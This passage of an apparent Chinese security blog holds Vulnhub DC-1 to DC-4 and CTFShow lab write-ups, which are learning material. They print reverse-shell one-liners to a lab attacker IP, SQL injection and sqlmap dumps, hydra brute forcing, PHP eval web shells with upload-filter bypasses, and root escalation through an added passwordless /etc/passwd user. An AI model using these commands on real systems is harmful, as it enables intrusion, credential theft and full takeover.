class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;123&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非预期解<br>自己给自己转账，指数增长，不能超过当前余额</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-4靶机渗透记录</title>
      <link href="/posts/bacc01ec/"/>
      <url>/posts/bacc01ec/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-4打靶记录"><a href="#Vulnhub-DC-4打靶记录" class="headerlink" title="Vulnhub DC-4打靶记录"></a>Vulnhub DC-4打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p>发现目标192.168.168.153扫下端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.153 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220707175229860.png" alt="image-20220707175229860"></p><p>只有一个80端口</p><p><img src="/posts/bacc01ec/image-20220707175340019.png" alt="image-20220707175340019"></p><p>一个管理员登录界面 看下能不能注入</p><p><img src="/posts/bacc01ec/image-20220707175904576.png" alt="image-20220707175904576"></p><p>看来不行</p><p>目录扫描也没有结果</p><p>试下爆破管理员密码</p><p>用burp爆破出来密码为happy</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>登录到后台</p><p>发现可以执行命令</p><p><img src="/posts/bacc01ec/image-20220707194145456.png" alt="image-20220707194145456"></p><p>抓包看下参数</p><p><img src="/posts/bacc01ec/image-20220707194257511.png" alt="image-20220707194257511"></p><p>把radio参数改为反弹shell命令空格用+代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+-e+/bin/bash+192.168.168.129+4444</span><br></pre></td></tr></table></figure><p>记得kali要先监听4444端口</p><p><img src="/posts/bacc01ec/image-20220707195334495.png" alt="image-20220707195334495"></p><p>权限很低没有写权限只能读文件 看下敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc/passwd</span><br></pre></td></tr></table></figure><p>看到三个用户charles，jim，sam</p><p><img src="/posts/bacc01ec/image-20220708224335646.png" alt="image-20220708224335646"></p><p>在jim的home目录下看到一个备份文件</p><p><img src="/posts/bacc01ec/image-20220708224610677.png" alt="image-20220708224610677"></p><p>应该是备份密码 把里面内容copy到pass.txt</p><p>该ip开放有22端口 可以ssh爆破用hydra 再新建一个user.txt 内容就是那三个用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 192.168.168.153 ssh</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220708225906866.png" alt="image-20220708225906866"></p><p>成功爆破出jim的ssh密码</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用Xshell连接靶机ssh</p><p>翻一下文件 再home目录下发现一个测试邮件</p><p><code>var/mail</code>下发现一个邮件</p><p>发现charles的密码</p><p><img src="/posts/bacc01ec/image-20220709183018101.png" alt="image-20220709183018101"></p><p>换到charles用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>看下可以执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709183558427.png" alt="image-20220709183558427"></p><p>可以执行teehee命令（teehee命令可以写入文件内容并不覆盖文件原有内容）</p><p>可以利用teehee进行提权，用teehee把一个无密码用户写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;fatty::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;passwd </p><p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p><p>用户名，就是一串代表用户身份的字符串。</p><p>UID:也就是用户 ID（<code>0</code>超级用户，<code>1~499</code>系统用户（伪用户）<code>500~65535</code> 普通用户）</p><p>GID:全称“Group ID”，简称“组ID”，表示用户初始组的组 ID 号</p></blockquote><p>切换到fatty用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su fatty</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184644368.png" alt="image-20220709184644368"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184757317.png" alt="image-20220709184757317"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-3靶机渗透记录</title>
      <link href="/posts/f0f28aa7/"/>
      <url>/posts/f0f28aa7/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-3打靶记录"><a href="#Vulnhub-DC-3打靶记录" class="headerlink" title="Vulnhub DC-3打靶记录"></a>Vulnhub DC-3打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224526760.png" alt="image-20220601224526760"></p><p>发现一个目标 扫描端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.146 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224606759.png" alt="image-20220601224606759"></p><p>只有一个80端口</p><p>使用wappalyzer发现cms: Joomla</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>百度下joomla的历史漏洞，发现存在sql注入漏洞</p><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601225344829.png" alt="image-20220601225344829"></p><p>确实存在sql注入漏洞可以利用</p><p>直接sqlmap开跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601230403567.png" alt="image-20220601230403567"></p><p>看看能不能拿到数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; -D joomladb -T &quot;#__users&quot; -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601231045796.png" alt="image-20220601231045796"></p><p>拿到admin用户密码的hash值</p><p><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p><p>利用john进行爆破</p><p>新建一个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim admin-hash</span><br></pre></td></tr></table></figure><p>把获取到的hash值填进去</p><p>john爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john admin-hash </span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220702225157861.png" alt="image-20220702225157861"></p><p>得到密码<code>snoopy</code></p><p>御剑扫描发现一个<a href="http://192.168.168.146/administrator/">http://192.168.168.146/administrator/</a></p><p>登录到后台</p><p>发现文件上传漏洞</p><p><img src="/posts/f0f28aa7/image-20220702225815839.png" alt="image-20220702225815839"></p><p><img src="/posts/f0f28aa7/image-20220705221027682.png" alt="image-20220705221027682"></p><p>进去新建一个shell.php</p><p>蚁剑连接url为:<a href="http://192.168.168.146/templates/beez3/shell.php">http://192.168.168.146/templates/beez3/shell.php</a></p><p><img src="/posts/f0f28aa7/image-20220705221131144.png" alt="image-20220705221131144"></p><p>为web权限</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用searchsploit查找Ubuntu 16.04可以利用的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220705221540008.png" alt="image-20220705221540008"></p><p>存在内核提权</p><p>查看利用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p>发现下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip </span><br></pre></td></tr></table></figure><p>解压文件</p><p>利用蚁剑上传exp</p><p><img src="/posts/f0f28aa7/image-20220706102455223.png" alt="image-20220706102455223"></p><p>反弹shell</p><p>在刚才的shell.php中写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.168.129 4444 &gt;/tmp/f&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>监听4444端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220706104510795.png" alt="image-20220706104510795"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-2靶机渗透记录</title>
      <link href="/posts/27100aff/"/>
      <url>/posts/27100aff/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-2"><a href="#Vulnhub-DC-2" class="headerlink" title="Vulnhub DC-2"></a>Vulnhub DC-2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描资产</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092019810.png" alt="image-20220515092019810"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -p- -T4 192.168.168.143</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092955208.png" alt="image-20220515092955208"></p><p>发现80端口存在 <code>Did not follow redirect to http://dc-2/</code> 也就是dns服务器无法重定向到<a href="http://dc-2/">http://dc-2/</a> 所以直接使用ip地址访问是无法成功的</p><p>所以要更改host文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p>windows下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p>添加一个192.168.168.143 dc-2</p><p><img src="/posts/27100aff/image-20220515094005916.png" alt="image-20220515094005916"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>更改完成后即可访问在主界面即可找到flag1</p><p><img src="/posts/27100aff/image-20220515094515186.png" alt="image-20220515094515186"></p><p>大概意思就是使用cewl生成密码字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pwd.txt </span><br></pre></td></tr></table></figure><p>在网站底部发现是wordpress建的</p><p>使用wpscan 枚举账户</p><p>api可以到<a href="https://wpvulndb.com/users/sign_up">https://wpvulndb.com/users/sign_up</a> 注册获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u --api-token xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>接下密码爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ user.txt -P /root/桌面/pwd.txt --api-token xxxxx</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515101623014.png" alt="image-20220515101623014"></p><p>接下来进入后台</p><p>wordpress的后台地址为:&#x2F;wp-admin</p><p>使用jerry账户登录发现flag2</p><p><img src="/posts/27100aff/image-20220515103444441.png" alt="image-20220515103444441"></p><p>大概意思是让我们另一个突破口</p><p>利用前面找到的ssh</p><p>使用tom账号成功登录</p><p>目录下存在flag3.txt</p><p>但是很多查看命令都看不了使用vi查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag.txt</span><br></pre></td></tr></table></figure><p>意思是让我们换成jerry用户</p><p>但tom使用rbash权限非常小 要想办法绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a # 把bin/sh给变量a</span><br><span class="line">export PATH=$PATH:/bin/ # 将/bin 作为PATH环境变量导出</span><br></pre></td></tr></table></figure><p>其他绕过方法：<a href="https://www.freebuf.com/articles/system/188989.html">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></p><p>切换到Jerry</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">cd /home/jerry</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515105352487.png" alt="image-20220515105352487"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>老样子还是uid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111029686.png" alt="image-20220515111029686"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111228910.png" alt="image-20220515111228910"></p><p>发现git为root权限执行</p><p>注意执行命令前先把终端变窄不然会报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help ifconfig</span><br></pre></td></tr></table></figure><p>在末尾输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat cat final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515112312605.png" alt="image-20220515112312605"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-1靶机渗透记录</title>
      <link href="/posts/84468c56/"/>
      <url>/posts/84468c56/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub-DC-1"><a href="#vulnhub-DC-1" class="headerlink" title="vulnhub DC-1"></a>vulnhub DC-1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212318465.png" alt="image-20220513212318465"></p><p>发现目标</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>目标开放80端口，访问</p><p>网站底部发现cms信息</p><p><img src="/posts/84468c56/image-20220513211257084.png" alt="image-20220513211257084"></p><p>利用msf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line">show options</span><br><span class="line">setRHOST 192.168.168.142</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212247156.png" alt="image-20220513212247156"></p><p>成功拿到会话</p><p>看下目录下都有什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212514963.png" alt="image-20220513212514963"></p><p>看一下flag1.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212550669.png" alt="image-20220513212550669"></p><p>意思是每个cms都有一个配置文件让我们找到他</p><p>翻了半天在&#x2F;var&#x2F;www&#x2F;sites&#x2F;default下找到了一个settings.php</p><p>打开发现了数据库账号密码以及flag2</p><p><img src="/posts/84468c56/image-20220513213324393.png" alt="image-20220513213324393"></p><p><img src="/posts/84468c56/image-20220513213439596.png" alt="image-20220513213439596"></p><p><img src="/posts/84468c56/image-20220513213513210.png" alt="image-20220513213513210"></p><p>进入到shell连接mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #完整的shell环境</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513220411683.png" alt="image-20220513220411683"></p><p>pass进行了加密</p><p>百度发现drupalCMS使用的是 &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh对密码进行加密的</p><p>同时我们也可以利用这个文件 自行机密一个密码然后替换掉原来的密码</p><p>到scripts进行调用发现不能用 到www目录下可以调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p>得到新密码的加密值</p><p><img src="/posts/84468c56/image-20220513221916364.png" alt="image-20220513221916364"></p><p>到mysql中把admin密码改成新密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DaAOPXcKfpHXmrZY07Ro0GS9X7JpEnIyQxOpJK3pHnnB3Ii/FR.T&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>进入到后台登录</p><p><img src="/posts/84468c56/image-20220513223201939.png" alt="image-20220513223201939"></p><p><img src="/posts/84468c56/image-20220513223215081.png" alt="image-20220513223215081"></p><p>发现flag3</p><p><img src="/posts/84468c56/image-20220513223236120.png" alt="image-20220513223236120"></p><p>在shell中全局搜索flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;flag*&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513223705776.png" alt="image-20220513223705776"></p><p>接下来就该提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用msf上传探针脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/桌面/LinEnum/LinEnum.sh /tmp/</span><br></pre></td></tr></table></figure><p>进入shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p>利用suid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225105361.png" alt="image-20220513225105361"></p><p>find可以用来提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch shell</span><br><span class="line">find shell -exec whoami \;</span><br><span class="line">find shell -exec netcat -lvp 5555 -e /bin/sh \; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新起一个终端</span></span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225920195.png" alt="image-20220513225920195"></p><p>完成</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_文件上传</title>
      <link href="/posts/fdac7c8/"/>
      <url>/posts/fdac7c8/</url>
      
        <content type="html"><![CDATA[<h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><p>前端验证只能上传png文件</p><p>方法一：关闭浏览器的js</p><p>方法二：</p><p>把一句话文件改为png后缀然后bp抓包改回php</p><p><img src="/posts/fdac7c8/image-20220403153443766.png" alt="image-20220403153443766"></p><p>文件上传在upload&#x2F;1.php</p><p>蚁剑连接flag在上级目录</p><h2 id="Web152"><a href="#Web152" class="headerlink" title="Web152"></a>Web152</h2><p>同web151的方法二</p><h2 id="Web153"><a href="#Web153" class="headerlink" title="Web153"></a>Web153</h2><p>利用.user.ini文件进行绕过</p><p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p><blockquote><p>官方文档:<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p><img src="/posts/fdac7c8/image-20220403203936524-165898386339940.png" alt="image-20220403203936524"></p><p>由上图可知PHP_INI_USER模式就是.user.ini</p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini</p><p>只有在当前目录下有php文件才可以使用</p><p>.user.ini的配置参数和php.ini相同</p><p>具体配置参数:<a href="https://www.php.net/manual/en/ini.list.php">https://www.php.net/manual/en/ini.list.php</a></p></blockquote><p>这里利用 auto_append_file 参数 作用是包含一个文件</p><p>首先要先上传一个.user.ini文件</p><p>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=<span class="string">&quot;1.txt&quot;</span> <span class="comment"># &quot;&quot;内为要上传的文件名字 注意不要是php后缀</span></span><br></pre></td></tr></table></figure><p>要绕过前端验证,先把后缀改为png然后抓包改为.user.ini</p><p><img src="/posts/fdac7c8/image-20220403214327526.png" alt="image-20220403214327526"></p><p>然后上传1.txt文件 内容为一句话</p><p>上传成功后蚁剑连接注意地址为<code>xxxx/upload</code>不是1.txt</p><h2 id="Web154"><a href="#Web154" class="headerlink" title="Web154"></a>Web154</h2><p>先上传上一题的.user.ini试下</p><p><img src="/posts/fdac7c8/image-20220412161942647.png" alt="image-20220412161942647"></p><p>继续上传1.txt</p><p><img src="/posts/fdac7c8/image-20220412162122727.png" alt="image-20220412162122727"></p><p><img src="/posts/fdac7c8/image-20220412162147450.png" alt="image-20220412162147450"></p><p>这里对文件内容进行了检查</p><p>经过测试是对php进行了过滤</p><p>利用短标签进行绕过</p><blockquote><p>短标记是用来输出变量或表达式，一般用法是<br><code>&lt;?=$a?&gt;</code><br><code>&lt;?=(表达式)?&gt;</code><br>就相当于<br><code>&lt;?php echo $a?&gt;`` ``&lt;?php echo (表达式)?&gt;</code></p></blockquote><p>这里把1.txt的内容改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412163101395.png" alt="image-20220412163101395"></p><p>上传成功，蚁剑连接 flag在老地方</p><h2 id="Web155"><a href="#Web155" class="headerlink" title="Web155"></a>Web155</h2><p>同web154</p><h2 id="Web156"><a href="#Web156" class="headerlink" title="Web156"></a>Web156</h2><p>先用web154的方法试下</p><p>发现1.txt无法上传</p><p>用二分法发现是[]被过滤 改为{}成功绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?</span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412165955739.png" alt="image-20220412165955739"></p><h2 id="Web157"><a href="#Web157" class="headerlink" title="Web157"></a>Web157</h2><p>老样子先上传.user.ini</p><p>发现1.txt没有办法上传</p><p>这里过滤了[]和{}</p><p>这里就换一个函数</p><blockquote><p>array_pop</p><p>array_pop — 弹出数组最后一个单元（出栈）</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$_POST</span>)) <span class="meta">?&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 这里array_pop的返回值正好是post传出的值 </span></span><br></pre></td></tr></table></figure><p>利用这个函数我们就可以通过文件上传再进行命令执行从而获取到flag</p><p>这里还对;进行了拦截 但是没关系 php结束的;是可以省略的</p><p><img src="/posts/fdac7c8/image-20220413091144516.png" alt="image-20220413091144516"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 